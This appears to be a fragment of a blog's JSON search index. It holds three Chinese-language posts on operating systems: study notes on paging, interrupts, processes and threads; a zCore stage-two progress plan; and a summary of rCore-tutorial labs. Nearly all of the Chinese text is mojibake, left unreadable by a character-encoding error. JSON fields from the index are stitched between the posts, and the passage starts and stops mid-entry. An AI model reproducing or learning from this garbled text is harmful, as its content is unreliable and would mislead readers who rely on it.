è™šæ‹ŸæŠ€æœ¯ï¼šéšç”¨éšè°ƒå…¥ï¼Œå®¹çº³è¿›ç¨‹è£…å…¥ï¼Œä¸»å­˜è´Ÿè´£è¿›ç¨‹æ‰§è¡Œï¼Œå¯¹ç”¨æˆ·é€æ˜ Cacheï¼šç”±SDRAMï¼Œè”æƒ³å­˜å‚¨å™¨ï¼Œåœ°å€è½¬æ¢éƒ¨ä»¶ï¼Œæ›¿æ¢é€»è¾‘ç»„æˆ L1 ï¼šæ•°æ®ç¼“å­˜ å’Œ æŒ‡ä»¤ç¼“å­˜ L2 : å†…ç½®å’Œå¤–ç½® L3 : å¤šä¸ºå¤–ç½® å­˜å‚¨ç®¡ç†åŸºæœ¬æ¨¡å¼ å•è¿ç»­å­˜å‚¨ç®¡ç†ï¼ˆä¸å¯è™šæ‹Ÿï¼‰ ä¸»å­˜åˆ†ä¸ºç³»ç»ŸåŒºï¼Œç”¨æˆ·åŒº æ …æ å¯„å­˜å™¨ é™æ€é‡å®šä½ é€‚ç”¨å•ç”¨æˆ·å•ä»»åŠ¡ å›ºå®šåˆ†åŒºå­˜å‚¨ç®¡ç†ï¼šåˆ†åŒºæ•°é‡ï¼Œå¤§å°å›ºå®šï¼Œä¸»å­˜åˆ†é…è¡¨ï¼Œå¯åŠ¨æ€é‡å®šä½ï¼Œæœ‰å†…å­˜å†…é›¶å¤´ å¯å˜åˆ†åŒºï¼šå·²åˆ†é…åŒºè¡¨å’Œæœªåˆ†é…åŒºè¡¨ï¼ˆé“¾è¡¨ï¼‰ï¼Œå†…å­˜å›æ”¶ï¼Œç§»åŠ¨åˆ†åŒºï¼ˆåŸºäºåŠ¨æ€é‡å®šä½ï¼‰ æ®µå¼å­˜å‚¨ç®¡ç† é€»è¾‘åœ°å€ï¼šæ®µå·ï¼šå•å…ƒå· æ®µè¡¨é¡¹ï¼šå§‹å€ï¼Œé™é•¿ï¼Œæ ‡å¿—ä½ å…±äº«ï¼šä¸åŒè¿›ç¨‹æ®µè¡¨é¡¹æŒ‡å‘åŒä¸€ä¸ªæ®µåŸºå€ å¹¶åŠ ä¿æŠ¤ è™šæ‹Ÿå­˜å‚¨ï¼šåŠ¨æ€è£…å…¥ï¼Œä¸æ®µè¦†ç›–ä¸åŒï¼Œç”¨æˆ·æ§åˆ¶ï¼ŒOSä¸æ„ŸçŸ¥ é¡µå¼å­˜å‚¨ç®¡ç† ç‰©ç†ï¼šé¡µæ¶ ï½œ é€»è¾‘ï¼šé¡µ ï½œ å¯ä¸è¿ç»­ é¡µè¡¨ï¼šé¡µ - é¡µæ¶ ä¸€ä¸€å¯¹åº” é€»è¾‘åœ°å€ï¼šã€Šé¡µå·ï¼Œå•å…ƒå·ã€‹ ä½ç¤ºå›¾ï¼šè®°å½•ä¸»å­˜åˆ†é…æƒ…å†µ å…±äº«ï¼šä¸åŒè¿›ç¨‹å¯ä»¥ä½¿ç”¨ä¸åŒé¡µå·å…±äº«æ•°æ®é¡µï¼Œä½†å¿…é¡»ä½¿ç”¨ç›¸åŒé¡µå·å…±äº«ä»£ç é¡µï¼ˆå¦åˆ™JMPã€Šé¡µå†…åœ°å€ã€‹å¤±æ•ˆï¼‰ å¿«è¡¨ï¼šCacheï¼ˆè”æƒ³å­˜å‚¨å™¨ï¼‰ä¸­çš„éƒ¨åˆ†é¡µè¡¨ è¿›ç¨‹è¡¨ï¼šæ ‡è®° è¿›ç¨‹ï¼Œé¡µè¡¨å§‹å€ï¼Œé¡µè¡¨é•¿åº¦ è™šæ‹Ÿå­˜å‚¨ï¼š é¦–æ¬¡åªæŠŠè¿›ç¨‹ç¬¬ä¸€é¡µè£…å…¥ ï¼šè¯·æ±‚é¡µå¼å­˜å‚¨ç®¡ç† æ‰©å……é¡µè¡¨é¡¹ï¼šè™šæ‹Ÿåœ°å€ï¼Œå®é™…åœ°å€ï¼Œæ ‡å¿—ä½ å®ç°ï¼šCPUå¤„ç†ä¸åœ¨ä¸»å­˜ï¼Œç¼ºé¡µä¸­æ–­ï¼›OSå¤„ç†åŠå…¥ç©ºé—²é¡µæ¶æˆ–è°ƒå‡ºå…¶ä»–é¡µ æ®µé¡µå¼å­˜å‚¨ç®¡ç† æ¯ä¸€æ®µä¸å¿…å æ®è¿ç»­å­˜å‚¨ç©ºé—´ï¼Œå¯ç¦»æ•£å­˜æ”¾åœ¨ä¸»å­˜é¡µæ¶ä¸­ æ®µè¡¨é¡¹ï¼šæ ‡å¿—ï¼Œé¡µè¡¨é•¿ï¼Œé¡µè¡¨å§‹å€ é€»è¾‘åœ°å€ï¼šæ®µå·ï¼Œé¡µå·ï¼Œå•å…ƒå· å¿«è¡¨æ— ï¼ŒæŸ¥è¯¢è¿‡ç¨‹ï¼šæŸ¥æ®µè¡¨å¾—åˆ°é¡µè¡¨ï¼Œé¡µå·ä¸ºåç§»é‡ï¼ŒæŸ¥åˆ°å—å·ï¼Œ+å•å…ƒå·å¾—åˆ°ç‰©ç†åœ°å€ é¡µé¢è°ƒåº¦ï¼š ç¼ºé¡µä¸­æ–­ç‡ï¼šä¸æˆåŠŸè®¿é—®/æ€»è®¿é—® å½±å“â¬†ï¸ï¼šå¯ç”¨é¡µæ¶æ•°ï¼Œé¡µé¢å¤§å° ï¼Œç®—æ³• OPTï¼šä¼˜å…ˆæ·˜æ±°ä¸‹ä¸€æ¬¡è®¿é—®ç¦»è¿™æ¬¡æœ€è¿œçš„é¡µé¢ FIFOï¼šä¼˜å…ˆæ·˜æ±°æœ€å…ˆè°ƒå…¥ä¸»å­˜çš„é‚£ä¸€é¡µ LRUï¼šä¼˜å…ˆæ·˜æ±°æœ€ä¹…æœªè¢«è®¿é—® CLOCKï¼šå¾ªç¯é˜Ÿåˆ— åç½®é¡µè¡¨ IPTï¼šMMUç”¨çš„æ•°æ®ç»“æ„ é¡µè¡¨é¡¹ï¼šé¡µæ¶å·ä»£è¡¨åºå·ï¼Œé¡µå·ï¼Œè¿›ç¨‹æ ‡å¿—ç¬¦ï¼Œæ ‡å¿—ä½ MMUé€šè¿‡å“ˆå¸Œè¡¨æŠŠè¿›ç¨‹æ ‡è¯†å’Œè™šé¡µå·è½¬ æ¢æˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼ŒæŒ‡å‘IPTçš„ä¸€ä¸ªè¡¨ç›® *MMU**éå†å“ˆå¸Œé“¾æ‰¾åˆ°æ‰€éœ€è¿›ç¨‹çš„è™šé¡µå·ï¼Œ è¯¥é¡¹çš„ç´¢å¼•å°±æ˜¯é¡µæ¶å·ï¼Œé€šè¿‡æ‹¼æ¥ä½ç§»ä¾¿å¯ç”Ÿæˆç‰©ç†åœ°å€ è‹¥éå†æ•´ä¸ªåç½®é¡µè¡¨ä¸­æœªèƒ½æ‰¾åˆ°åŒ¹é…é¡µè¡¨é¡¹ï¼Œè¯´æ˜è¯¥é¡µä¸åœ¨å†…å­˜ï¼Œäº§ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œ è¯·æ±‚æ“ä½œç³»ç»Ÿè°ƒå…¥ ä¸­æ–­ ä¸ ç³»ç»Ÿç»“æ„å¯„å­˜å™¨ ç”¨æˆ·ç¨‹åºå¯è§å¯„å­˜å™¨ï¼šæ•°æ®ï¼Œåœ°å€ï¼ˆæ ˆæŒ‡é’ˆç­‰ï¼‰ æ§åˆ¶ä¸çŠ¶æ€å¯„å­˜å™¨ï¼šPCï¼ŒCCï¼Œæ ‡å¿—ä½ç­‰ ç¨‹åºçŠ¶æ€å­— PSWï¼Œ æŒ‡ä»¤ å–æŒ‡ï¼Œè¯‘ç ï¼Œæ‰§è¡Œ ç‰¹æƒæŒ‡ä»¤ï¼ˆOSå†…æ ¸ä½¿ç”¨ï¼‰ï¼Œéç‰¹æƒï¼šç”¨æˆ·å¯ç”¨ å¤„ç†å™¨æ¨¡å¼ï¼š ç”¨æˆ·-å†…æ ¸ ï¼š ç³»ç»Ÿè°ƒç”¨ï¼Œå¼‚å¸¸ï¼Œå“åº”ä¸­æ–­ å†…æ ¸-ç”¨æˆ· ï¼š ä¸­æ–­è¿”å›æŒ‡ä»¤ ä¸­æ–­ æ“ä½œç³»ç»Ÿ â€œä¸­æ–­é©±åŠ¨â€ï¼Œä¸­æ–­æ˜¯æ¿€æ´»æ“ä½œç³»ç»Ÿå”¯ä¸€æ–¹å¼ ç‹­ä¹‰ä¸­æ–­ï¼ˆå¤„ç†å™¨ä¹‹å¤–ä¸­æ–­ï¼‰ï¼Œå¼‚å¸¸ï¼ˆè¿è¡ŒæŒ‡ä»¤ä¸­æ–­ï¼‰ï¼Œç³»ç»Ÿå¼‚å¸¸ï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰ ä¸­æ–­ç³»ç»Ÿï¼šç¡¬ä»¶å­ç³»ç»Ÿï¼ˆä¸­æ–­å“åº”ï¼‰ï¼Œè½¯ä»¶å­ç³»ç»Ÿï¼ˆä¸­æ–­å¤„ç†ï¼‰ æŒ‡ä»¤æ‰§è¡Œå‘¨æœŸæœ€åå¢åŠ  å“åº”ä¸­æ–­æ“ä½œ ä¸­æ–­è£…ç½® ï¼š å‘ç°å¹¶å“åº”ä¸­æ–­ å¤„ç†å™¨å¤–çš„ä¸­æ–­:ç”±ä¸­æ–­æ§åˆ¶å™¨å‘ç°å’Œå“åº” å¤„ç†å™¨å†…çš„å¼‚å¸¸:ç”±æŒ‡ä»¤çš„æ§åˆ¶é€»è¾‘å’Œå®ç°çº¿è·¯å‘ç°å’Œå“åº”ï¼Œç›¸åº”æœºåˆ¶ç§°ä¸ºé™·é˜± Syscall: å¤„ç†å™¨æ‰§è¡Œé™·å…¥æŒ‡ä»¤æ—¶ç›´æ¥è§¦å‘ï¼Œç›¸åº”æœºåˆ¶ç§°ä¸ºç³»ç»Ÿé™·é˜± ä¸­æ–­æ§åˆ¶å™¨ï¼šæ§åˆ¶ å’Œ å¯„å­˜å™¨ å¯„å­˜å™¨è®°å½•ä¸­æ–­ ï¼ŒæŒ‡ä»¤å¤„ç†æœ€åæ£€æŸ¥å¯„å­˜å™¨ é™·é˜± ä¸ ç³»ç»Ÿé™·é˜± ä¸­æ–­å“åº”è¿‡ç¨‹ï¼š æ£€æŸ¥ä¸­æ–­å¯„å­˜å™¨ï¼Œæ˜¯å¦è¯¥å±è”½ï¼Œæ ¹æ®ä¼˜å…ˆçº§é€‰æ‹© ä¿å­˜ PSW/PC åˆ° æ ¸å¿ƒæ ˆ è½¬åˆ° ä¸­æ–­å¤„ç†ç¨‹åº ä¸­æ–­å¤„ç† ä¿æŠ¤å¤„ç†å™¨çŠ¶æ€ è¯†åˆ«ä¸­æ–­æº å¤„ç†ä¸­æ–­ æ¢å¤æ­£å¸¸æ“ä½œ - è¿”å›ä¸­æ–­è¿›ç¨‹ æˆ– è°ƒæ•´è¿›ç¨‹é˜Ÿåˆ— å¤šä¸­æ–­å¤„ç†ï¼š å±è”½ ï¼Œä¼˜å…ˆçº§ï¼ŒåµŒå¥—ï¼ˆã€Š=3ï¼Œå¯èƒ½æ”¹å˜å¤„ç†é¡ºåºï¼‰ è¿›ç¨‹è¿›ç¨‹ ï¼š åŠ¨æ€ ï¼Œ èµ„æºåˆ†é…å’Œè°ƒåº¦çš„åŸºæœ¬å•ä½ åŒ…æ‹¬ï¼šOSç®¡ç†çš„æ•°æ®ç»“æ„Pï¼Œå†…å­˜ä»£ç Cï¼Œå†…å­˜æ•°æ®Dï¼Œé€šç”¨å¯„å­˜å™¨ä¿¡æ¯Rï¼Œç¨‹åºçŠ¶æ€å­—PSW å¯å†å…¥ç¨‹åºï¼šç›¸åŒä»£ç ä¸åŒæ•°æ®é›†ï¼Œçº¯ä»£ç  ä¸åŒæ—¶é—´ä¸­é’ˆå¯¹ åŒä¸€ä¸ªç¨‹åºè¿è¡Œ å½¢æˆä¸¤ä¸ªä¸åŒçš„è¿›ç¨‹ è¿›ç¨‹çŠ¶æ€ï¼š è¿è¡Œæ€ï¼Œå°±ç»ªæ€ï¼Œç­‰å¾…æ€ graph TD A(è¿è¡Œæ€) --&gt;|è½é€‰| B(å°±ç»ªæ€) B(å°±ç»ªæ€) --&gt;|é€‰ä¸­| A(è¿è¡Œæ€) C(ç­‰å¾…æ€) --&gt; |ç­‰å¾…äº‹ä»¶ç»“æŸ|B(å°±ç»ªæ€) A(è¿è¡Œæ€) --&gt; |å‡ºç°ç­‰å¾…äº‹ä»¶| C(ç­‰å¾…æ€) æŒ‚èµ· è¿›ç¨‹æ§åˆ¶å— PCBï¼š æ ‡è¯†ä¿¡æ¯ - ç°åœºä¿¡æ¯ï¼ˆå¯„å­˜å™¨ï¼‰ - æ§åˆ¶ä¿¡æ¯ è¿›ç¨‹æ˜ åƒï¼ˆå†…å­˜æ˜ åƒï¼‰ï¼š PCBï¼Œç¨‹åºå—ï¼Œæ•°æ®å—ï¼Œæ ¸å¿ƒæ ˆ è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼šç”¨æˆ·çº§ï¼Œå¯„å­˜å™¨ï¼Œç³»ç»Ÿçº§ é˜Ÿåˆ—ç®¡ç†æ¨¡å—ï¼šè¿›ç¨‹ç®¡ç†æ ¸å¿ƒæ¨¡å— è¿›ç¨‹æ§åˆ¶ä¸ç®¡ç†ï¼š è¿›ç¨‹åˆ›å»º:è¿›ç¨‹è¡¨åŠ ä¸€é¡¹ï¼Œç”³è¯·PCBå¹¶åˆå§‹åŒ–ï¼Œ ç”Ÿæˆæ ‡è¯†ï¼Œå»ºç«‹æ˜ åƒï¼Œåˆ†é…èµ„æºï¼Œç§»å…¥å°±ç»ªé˜Ÿåˆ—â€¢ è¿›ç¨‹æ’¤é”€:ä»é˜Ÿåˆ—ä¸­ç§»é™¤ï¼Œå½’è¿˜èµ„æºï¼Œæ’¤é”€æ ‡è¯†ï¼Œ å›æ”¶PCBï¼Œç§»é™¤è¿›ç¨‹è¡¨é¡¹â€¢ è¿›ç¨‹é˜»å¡:ä¿å­˜ç°åœºä¿¡æ¯ï¼Œä¿®æ”¹PCBï¼Œç§»å…¥ç­‰å¾… é˜Ÿåˆ—ï¼Œè°ƒåº¦å…¶ä»–è¿›ç¨‹æ‰§è¡Œâ€¢ è¿›ç¨‹å”¤é†’:ç­‰å¾…é˜Ÿåˆ—ä¸­ç§»å‡ºï¼Œä¿®æ”¹PCBï¼Œç§»å…¥å°± ç»ªé˜Ÿåˆ—(è¯¥è¿›ç¨‹ä¼˜å…ˆçº§é«˜äºè¿è¡Œè¿›ç¨‹è§¦å‘æŠ¢å )â€¢ è¿›ç¨‹æŒ‚èµ·:ä¿®æ”¹çŠ¶æ€å¹¶å‡ºå…¥ç›¸å…³é˜Ÿåˆ—ï¼Œæ”¶å›å†…å­˜ç­‰èµ„æºé€è‡³å¯¹æ¢åŒºâ€¢ è¿›ç¨‹æ¿€æ´»:åˆ†é…å†…å­˜ï¼Œä¿®æ”¹çŠ¶æ€å¹¶å‡ºå…¥ç›¸å…³é˜Ÿåˆ—â€¢ å…¶ä»–:å¦‚ä¿®æ”¹è¿›ç¨‹ç‰¹æƒ è¿›ç¨‹åˆ‡æ¢ï¼šä¸­æ–­è§¦å‘ ï¼Œå‹å…¥PSW/PC å¤„ç†ä¸­æ–­ è¢«ä¸­æ–­è¿›ç¨‹ ä¿å­˜å€¼ï¼Œ çŠ¶æ€è°ƒæ•´ï¼ŒåŠ å…¥é˜Ÿåˆ— é€‰ä¸­ä¸‹ä¸€ä¸ªè¿›ç¨‹ è°ƒæ•´æ¢å¤ï¼Œé€‰ä¸­è¿›ç¨‹ ä¸­æ–­è¿”å›ï¼Œå¼¹å‡ºPSW/PC çº¿ç¨‹å•çº¿ç¨‹ï¼ˆè¿›ç¨‹ï¼‰é—®é¢˜ï¼šè¿›ç¨‹åˆ‡æ¢å¼€é”€å¤§ï¼Œè¿›ç¨‹é€šä¿¡å¼€é”€å¤§ï¼Œé™åˆ¶äº†è¿›ç¨‹å¹¶å‘çš„ç²’åº¦ï¼Œé™ä½äº†å¹¶è¡Œè®¡ç®—çš„æ•ˆç‡ å°†è¿›ç¨‹ èµ„æºåˆ†é… å’Œ ç³»ç»Ÿè°ƒåº¦åˆ†æ´¾æ‰§è¡Œåˆ†ç¦»å¼€ï¼š è¿›ç¨‹ ï¼š ç³»ç»Ÿèµ„æºåˆ†é… å’Œä¿æŠ¤çš„ç‹¬ç«‹å•ä½ï¼Œä¸éœ€é¢‘ç¹åˆ‡æ¢ ï¼ˆå®¹çº³è¿›ç¨‹æ˜ åƒï¼Œå­˜å–ä¿æŠ¤ï¼‰ çº¿ç¨‹ ï¼šç³»ç»Ÿè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œèƒ½è½»æ¾çš„è¢«é¢‘ç¹åœ°è°ƒåº¦å’Œåˆ‡æ¢ å…·æœ‰ï¼šçº¿ç¨‹æ‰§è¡ŒçŠ¶æ€ï¼Œå—ä¿æŠ¤çš„ä¸Šä¸‹æ–‡ï¼Œç‹¬ç«‹ç¨‹åºæŒ‡ä»¤è®¡æ•°å™¨ï¼Œæ‰§è¡Œå †æ ˆï¼Œé™æ€å­˜å‚¨å™¨ï¼ˆå±€éƒ¨å˜é‡ï¼‰ çŠ¶æ€ï¼šè¿è¡Œï¼Œå°±ç»ªï¼Œç¡çœ  å¹¶å‘å¤šçº¿ç¨‹ä¼˜ç‚¹ï¼š å¿«é€Ÿçº¿ç¨‹åˆ‡æ¢ï¼Œå‡å°‘ç³»ç»Ÿç®¡ç†å¼€é”€ï¼Œçº¿ç¨‹é€šä¿¡æ˜“äºå®ç°ï¼Œå¹¶è¡Œç¨‹åº¦æé«˜ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´ KLTï¼šå†…æ ¸è°ƒåº¦æ–¹ä¾¿ï¼Œæœ¬èº«ä¹Ÿå¯å¤šçº¿ç¨‹ï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºçº¿ç¨‹åœ¨ç”¨æˆ·æ€ï¼Œæ§åˆ¶æƒåˆ‡æ¢éœ€è¦æ¨¡å¼åˆ‡æ¢ï¼Œå¼€é”€å¤§ ULTï¼šèŠ‚çœæ¨¡å¼åˆ‡æ¢å¼€é”€ï¼Œä¸æ‰“æ‰°å†…æ ¸ï¼Œç¨‹åºç®¡ç†ï¼›è¿è¡Œåœ¨ä»»ä½•OSï¼›ç¼ºç‚¹ï¼šä¸èƒ½åˆ©ç”¨å¤šå¤„ç†å™¨ï¼Œå¼•èµ·è¿›ç¨‹å µå¡ å¯ç”¨ jacketing ç¨‹åº æ¥å†³å®š è¿›ç¨‹åˆ‡æ¢ æˆ– ä¼ é€’æ§åˆ¶æƒç»™å¦ä¸€ä¸ªçº¿ç¨‹ å†…æ ¸åªè´Ÿè´£è¿›ç¨‹è°ƒåº¦ ULTï¼šé€»è¾‘å¹¶è¡Œæ€§ KLTï¼šç‰©ç†å¹¶è¡Œæ€§ æ··åˆæ¨¡å¼ï¼šå¤šä¸ªULTæ˜ å°„ä¸€äº›KLT å¤„ç†å™¨è°ƒåº¦é«˜çº§è°ƒåº¦ï¼šèƒ½å¦åŠ å…¥åˆ°æ‰§è¡Œçš„è¿›ç¨‹æ± ä¸­ ï¼ˆå¤šæ–°å»º ç»ˆæ­¢ï¼‰ ä¸­çº§è°ƒåº¦ï¼šå†³å®šä¸»å­˜ä¸­çš„å¯ç”¨è¿›ç¨‹é›†åˆ ï¼ˆå¸¦ æŒ‚èµ·ï¼‰ ä½çº§è°ƒåº¦ï¼šå†³å®šå“ªä¸ªå¯ç”¨è¿›ç¨‹å ç”¨å¤„ç†å™¨æ‰§è¡Œ ï¼ˆåŸä¸‰æ€ï¼‰","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"}]},{"title":"zCore ç¬¬äºŒé˜¶æ®µæ€»ç»“åŠè§„åˆ’","date":"2020-08-01T07:07:32.000Z","path":"2020/08/01/ç¬¬äºŒé˜¶æ®µæ€»ç»“åŠè§„åˆ’/","text":"æœ¬æ–‡æ˜¯zCore çš„ç¬¬äºŒé˜¶æ®µçš„æ€»ç»“ä»¥åŠå¯¹æ¥ä¸‹æ¥å·¥ä½œçš„è§„åˆ’ ç¬¬äºŒé˜¶æ®µ æ€»ç»“ åŠ è§„åˆ’è®¡åˆ’å’Œæ€»ç»“é€Ÿåº¦ ï¼ˆæœ‰ç‚¹ç²—ç³™ï¼‰ ä½†æ˜¯ å¿«é€Ÿè¿­ä»£VMOä¸»è¦çš„ç±»å‹ ï¼š VMObjectPaged : ä¸»è¦çš„VMO ï¼Œ æŒæ§ä¸€ç»„ç‰©ç†é¡µé¢ çˆ¶èŠ‚ç‚¹ æŒæ§çš„ç‰©ç†é¡µé¢ æ˜ å°„å…³ç³» æ ‡å¿—ä½ é«˜é€Ÿç¼“å­˜ç­–ç•¥ pin_count ç­‰ VMObjectPhysical ï¼šä»£è¡¨ä¸€æ®µè¿ç»­ç‰©ç†å†…å­˜ VMObjectSlice : ç‰©ç†å†…å­˜åˆ‡ç‰‡ æ ‘çŠ¶ç»“æ„ ï¼š åˆ©ç”¨ çˆ¶èŠ‚ç‚¹çš„ åç§»é‡ å’Œ é¡µé¢é™åˆ¶æ¥å®ç° ç›®æ ‡å•å…ƒæµ‹è¯•å®Œå–„ VMO éƒ¨åˆ†çš„ å•å…ƒæµ‹è¯• ç®€åŒ–å¯¹æ ‘ç»“æ„çš„ ç®€åŒ– åŒ…æ‹¬ æ›¾ç»ï¼Œ copy_on_write åˆ©ç”¨ ä¸€ä½æ ‡å¿—ä½å®ç°ï¼Œå¹¶è°ƒæ•´å¯è¯»å†™ä¸ºï¼Œå®ç°ä¸å¯å†™ï¼Œæœ€ç»ˆåœ¨ pagefaultçš„æ—¶å€™åœ¨è¿›è¡Œ copy åˆ° ç›´æ¥ copy Debugshell éƒ¨åˆ† å¯èƒ½æœ‰ä¸€äº› VMO éƒ¨åˆ†çš„bugéœ€è¦ï¼Œåœ¨zCore æ•´ä½“äº†è§£åï¼Œdeè¿™éƒ¨åˆ†çš„bug å»ºè®®æ€»è§‰å¾— Tutorial å¯¹äº å­¦ç”Ÿçš„ç†è§£æœ‰ç‚¹ç”Ÿæ¶©æˆ‘çš„è®¡åˆ’æ˜¯æŒ‰ç…§å­¦é•¿çš„è®¡åˆ’ PPT æˆ– è§†é¢‘æŠ¥å‘Š åŸºç¡€çŸ¥è¯†çš„ä»‹ç» ä»£ç  å’Œ æµ‹è¯•çš„ç¼–å†™ æ€»ç»“ æ—¶é—´è®¡åˆ’8.15-30 æœŸæœ«è€ƒè¯•ï¼Œå¸Œæœ›ä½œä¸ºæ—¶é—´åˆ†é…ï¼Œé€æ¸æ…¢æ…¢æ¨è¿› 9.1 å·ä¹‹å æˆ‘çš„ç›®æ ‡ä»ç„¶è¿˜æ˜¯å¸Œæœ›ç»§ç»­è¿›è¡Œ zCore-Tutorial å¯èƒ½å°±æ˜¯è®¾è®¡ zCore-Tutorial å®éªŒï¼Œäº‰å–å¼€è‚ zCore-Tutorial v2 å¯èƒ½é‡åˆ°çš„é—®é¢˜ debug è¿‡ç¨‹ä¸­å¯èƒ½é‡åˆ°ä¸å¯çŸ¥çš„éš¾åº¦ Tutorial ç¼–å†™è¿‡ç¨‹ä¸­ï¼Œå¸Œæœ›èƒ½ ä»¥ä¸ªäººä¸ºå•ä½ï¼Œè‡ªå·±å®ŒæˆzCore æ•´ä½“çš„å¤ç°ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ ç­‰ç­‰","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"},{"name":"zCore","slug":"zCore","permalink":"https://dingiso.github.io/tags/zCore/"}]},{"title":"rCore-tutorial æ€»ç»“æ–‡æ¡£","date":"2020-07-25T12:07:05.000Z","path":"2020/07/25/rCore-tutorialæ€»ç»“æ–‡æ¡£/","text":"lab ç®€å•æ€»ç»“æœ¬æ–‡æ˜¯å¯¹rCore-tutorialç¬¬ä¸€é˜¶æ®µçš„6ä¸ªlabçš„æ€»ç»“æ–‡æ¡£ï¼Œç®€å•æ¦‚æ‹¬äº†æ¯ä¸ªlabçš„å†…å®¹å’Œä½œç”¨ lab-0 ç®€å•æ€»ç»“ ä¸ºäº†å€Ÿç”¨æ–°çš„ç‰¹æ€§ nightly std ä¾èµ–æ“ä½œç³»ç»Ÿ #![no_std] ç¦ç”¨ panic_handler ä¹Ÿåœ¨stdåº“ä¸­ï¼Œä½†æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¿…é¡»å®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ª å¼‚å¸¸æ—¶æ˜¯è¦é€šè¿‡å †æ ˆåå‘æ•è·å¼‚å¸¸å¹¶æ¸…ç†ç°åœºçš„ï¼Œæš‚æ—¶ä¸éœ€å®ç°ï¼Œæ‰€ä»¥panicç›´æ¥ç»ˆæ­¢ mainå‡½æ•°å¹¶ä¸èƒ½ä½œä¸ºæ“ä½œç³»ç»Ÿå…¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨_start å‡½æ•°ä»£æ›¿ï¼Œå¹¶åˆ©ç”¨ extern &quot;C&quot; å’Œ # [no_mangle] æ¥ä½¿å¾—ä»–æˆä¸ºå…¥å£å‡½æ•° é€šè¿‡æ”¹å˜é“¾æ¥å™¨å‚æ•°ï¼Œä½¿å¾—ç¨‹åºç¼–è¯‘æˆä¸ä¾èµ–å…¶ä»–è¿è¡Œæ—¶ç¯å¢ƒçš„è£¸æœºç›®æ ‡ å¯¹äºä¸€ä¸ªOSå†…æ ¸ï¼Œä»–çš„èµ·å§‹åœ°å€å’Œæ™®é€šç¨‹åºä¸åŒï¼Œåœ¨é«˜åœ°å€ä¸Šï¼Œé€šè¿‡æ›´æ”¹-é“¾æ¥è„šæœ¬ é€šè¿‡æ›´æ”¹é“¾æ¥è„šæœ¬ä½¿å¾—ï¼Œå†…æ ¸æ”¾åœ¨æ­£ç¡®çš„åœ°å€ä¸Šï¼Œå¹¶ä¾æ¬¡æŒ‰é¡ºåºæ’æ”¾ï¼Œ_start åœ¨å…ˆ. å†…æ ¸è¿è¡Œè¿˜éœ€è¦ç¯å¢ƒæ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æ±‡ç¼–é‡å†™_start ï¼Œåˆ†é…å¯åŠ¨æ ˆï¼Œå¹¶è·³è½¬åˆ°å†…æ ¸å…¥å£ å°†æ±‡ç¼–ä»£ç å†…è”åˆ°main.rsä¸­ï¼Œå¹¶æ›´æ”¹å†…æ ¸å…¥å£ä¸ºrust_main å»ºç«‹Makefile ä¿å­˜ç¼–è¯‘è¿è¡Œå‚æ•°ï¼Œæ–¹ä¾¿ç›´æ¥è°ƒç”¨è¿è¡Œ OpenSBI æ‰€æä¾›çš„SBIè°ƒç”¨å‚æ•° 0-8 ï¼Œä¸ºæˆ‘ä»¬æä¾›æ“ä½œæ“ä½œç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½ è¾“å‡ºåŠŸèƒ½åˆ©ç”¨coreä¸­çš„è¾“å‡ºå‡½æ•°è°ƒç”¨SBIçš„å•å­—ç¬¦è¾“å‡ºï¼Œå¹¶åˆ©ç”¨printlnç­‰å®è¿›è¡Œå°è£… å®Œå–„ panic å’Œ abort åŠŸèƒ½ lab-1 ç®€å•æ€»ç»“ ä¸­æ–­å¤„ç†é¦–å…ˆè¦ä¿å­˜ä¸Šä¸‹æ–‡(å³å¯„å­˜å™¨)åœ¨æ ˆä¸­,å¹¶åœ¨ä¸­æ–­åæ¢å¤,åˆ†ä¸ºä¸¤éƒ¨åˆ†: context :é€šç”¨32ä¸ªå¯„å­˜å™¨,ä¿å­˜è§¦å‘ä¸­æ–­çš„æŒ‡ä»¤åœ°å€sepcå’Œç³»ç»ŸçŠ¶æ€çš„sstatus å•åˆ— :ä¿å­˜ä¸­æ–­ä¸»è¦ä¿¡æ¯å’ŒåŸå› çš„ scause å’Œ stval,å› ä¸ºåé¢éœ€è¦ä½¿ç”¨æ‰€ä»¥å•ç‹¬ åˆ©ç”¨æ±‡ç¼–å°†å¯„å­˜å™¨çš„å€¼å­˜å‚¨åœ¨æ ˆä¸­,æ³¨æ„æ ˆå¯„å­˜å™¨spå°±æ˜¯x2,æ‰€ä»¥éœ€è¦ç©ºå‡ºä»– åˆ©ç”¨ STIE ä½å¼€å¯æ—¶é’Ÿä¸­æ–­,åˆ©ç”¨ sstatus çš„ SIE ä½,å…è®¸å†…æ ¸æ€è¢«ä¸­æ–­æ‰“æ–­ é€šè¿‡sbi_call å¯ä»¥é¢„çº¦ä¸‹ä¸€æ¬¡çš„æ—¶é’Ÿä¸­æ–­,timeå‚æ•°å°±æ˜¯ä¸­æ–­æ—¶é—´ æ€»ç»“ æ—¶é’Ÿä¸­æ–­çš„è°ƒç”¨è¿‡ç¨‹ ## lab-2 ç®€å•æ€»ç»“ å¯¹äºåŠ¨æ€å†…å­˜åˆ†é…ï¼Œæˆ‘ä»¬éœ€è¦å®ä¾‹ä¸€ä¸ªå †å¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡å¿…é¡»å…·æœ‰ä»¥ä¸‹ç‰¹å¾ å®ç° Trait GlobalAlloc çš„åˆ†é…åŠŸèƒ½ å®ç° alloc å’Œ dealloc å‡½æ•° ï¼Œ è¦æ±‚åˆ†é…è¿ç»­sizeå¤§å°ï¼Œæ»¡è¶³alignå¯¹é½ ä½¿ç”¨è¯­ä¹‰é¡¹#[global_allocator]è¿›è¡Œæ ‡è®° 